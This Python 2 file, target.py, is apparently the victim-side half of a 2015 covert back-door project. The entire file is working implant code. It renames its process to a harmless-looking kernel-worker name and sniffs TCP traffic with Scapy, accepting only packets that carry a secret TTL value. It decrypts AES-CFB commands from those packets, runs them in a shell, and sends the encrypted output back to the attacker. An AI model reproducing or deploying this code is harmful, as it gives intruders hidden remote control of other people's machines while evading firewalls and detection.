'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
--  SOURCE FILE:    target.py
--
--  AUTHOR:         Thilina Ratnayake
--
--  PROGRAM:        Covert back-door that upon running, masks process name and
--                  listens for commands from an attacker on raw sockets
--                  to circumvent the firewall.
--
--  FUNCTIONS:      decryptCommand(string)
--                  receivedPacket(packet)
--                  encryptCommand(string)
--                  commandResult(packet)
--
--  DATE:           October 17, 2015
--
--  REVISIONS:
--
--  NOTES:
--  The program requires the PyCrypto and Scapy libraries for encryption and packet
--  crafting respectively.
--  'pip install pycrpyto' or https://www.dlitz.net/software/pycrypto/
--  'pip install scapy' or http://www.secdev.org/projects/scapy/
'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
import sys # Used for exiting the system on errors
import logging #Dependancy for next import
logging.getLogger("scapy.runtime").setLevel(logging.ERROR) #Used to supress scapy
#              warnings so that nothing is printed to screen when packets are sent
from scapy.all import * #Scapy packet crafting library
import os # Used for executing commands on shell.
from Crypto.Cipher import AES #Used to encrypt and decrypt messages
import setproctitle #Used for process masking

#################################GLOBAL VARIABLES#################################
global clientIP
global listening
global ttlKey
global decryptionKey
global IV
global dstPort
global processName

'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
--  FUNCTION
--  Name:       Usage
--  Parameters:
--     None
--  Return Values:
--      None.
--  Description:
--      Ensures that user enters in the proper values by checking the number of arguments
--      Command should be in the format python client.py <dstPort> <ttlKey>  <processName>
--      <decryptionKey><IV>
--      i.e. - python blackhat.py 192.168.0.5 80 71 0123456789abcdef abcdefghijklmnop [KWorker2:0]
'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''

def usage():
    global ttlKey
    global decryptionKey
    global IV
    global dstPort
    global processName
    if len(sys.argv) < 5:
        print "Please use format python client.py <dstPort> <ttlkey> <decryptionKey> <IV> <processName>"
        sys.exit()
    else:
        if len(sys.argv[3]) < 16:
            print "Please ensure decryption key is 16 characters in length"
            sys.exit()
        if len(sys.argv[4]) < 16:
            print "Please ensure that the IV is 16 characters in legnth"
            sys.exit()
        global ttlKey
        dstPort = int(sys.argv[1])
        print "dstPort is " + str(dstPort)
        ttlKey  = int(sys.argv[2])
        print "ttlKey is " + str(ttlKey)
        decryptionKey = sys.argv[3]
        print "Decryption key is " + decryptionKey
        IV = sys.argv[4]
        print "IV is " + IV
        processName = sys.argv[5]
        print "Process Name is " + processName

'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
--  FUNCTION
--  Name:       decryptCommand
--  Parameters:
--     String
--      The encrypted command contained in the packet payload.
--  Return Values:
--      String
--          The decrypted plain text command contained in the packet payload.
--  Description:
--      The function takes the encrypted command contained in the packet payload
--      and decrypts is using the same key and IV used at the attackers system.
'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
def decryptCommand(command):
    global decryptionKey
    decryptionKey = decryptionKey
    global IV
    IV = IV
    decryptor = AES.new(decryptionKey, AES.MODE_CFB, IV=IV)
    plain = decryptor.decrypt(command)
    return plain

'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
--  FUNCTION
--  Name:       encryptCommand
--  Parameters:
--      String
--          The user's command string to added into the packet payload
--  Return Values:
--      Encrypted command string
--  Description:
--      Function encrypts the plaintext command entered by user using PyCrypto.
--      Encrypted with AES CFB.
'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
def encryptCommand(command):
    global decryptionKey
    global ttlKey
    encryptionKey = decryptionKey
    ttlKey = ttlKey
    # key='0123456789abcdef'
    # IV = "abcdefghijklmnop"
    encryptor = AES.new(encryptionKey,AES.MODE_CFB,IV=IV)
    return encryptor.encrypt(command)

'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
--  FUNCTION
--  Name:       receivedPacket
--  Parameters:
--     String
--      The encrypted command contained in the packet payload.
--  Return Values:
--      String
--          The decrypted plain text command contained in the packet payload.
--  Description:
--      The function takes the encrypted command contained in the packet payload
--      and decrypts is using the same key and IV used at the attackers system.
'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
def receivedPacket(packet):
    global ttlKey
    global dstPort
    if IP in packet[0]:
        #Authenticate that the packets are actually from the attacker
        # Key is TTL 71
        if packet[IP].ttl == ttlKey:
            srcIP = packet[IP].src
            srcPort = packet[TCP].sport
            command = decryptCommand(packet["Raw"].load)
            #Execute the command
            f = os.popen(command)
            result = f.read()
            if result == "":
                result = "ERROR or No Output Produced"
            newPacket = (IP(dst=srcIP, ttl=ttlKey)/TCP(sport=dstPort, dport=srcPort)/encryptCommand(result))
            send(newPacket, verbose = False)
            return True
        else:
            return False

#MAIN()
if __name__ == "__main__":
    global dstPort
    global processName
    usage()

    #Set process title to something less suspicious
    setproctitle.setproctitle(processName)

    #Listen for connections
    listening = True;
    while listening:
        sniff(filter='tcp and dst port '+str(dstPort), stop_filter=receivedPacket)
